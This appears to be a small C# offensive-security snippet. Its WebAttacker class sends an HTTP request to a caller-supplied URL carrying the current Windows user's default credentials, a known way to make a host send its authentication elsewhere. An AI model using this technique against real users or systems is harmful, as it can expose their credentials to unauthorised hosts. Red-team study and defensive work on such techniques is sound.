using System;
using System.Net;

namespace OffensiveCS
{
    class WebAttacker
    {
        public static void DefaultCredsAttack(string url)
        {
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);

            req.Credentials = CredentialCache.DefaultCredentials;

            HttpWebResponse res = (HttpWebResponse)req.GetResponse();

            Console.WriteLine(res);
        }
    }
}
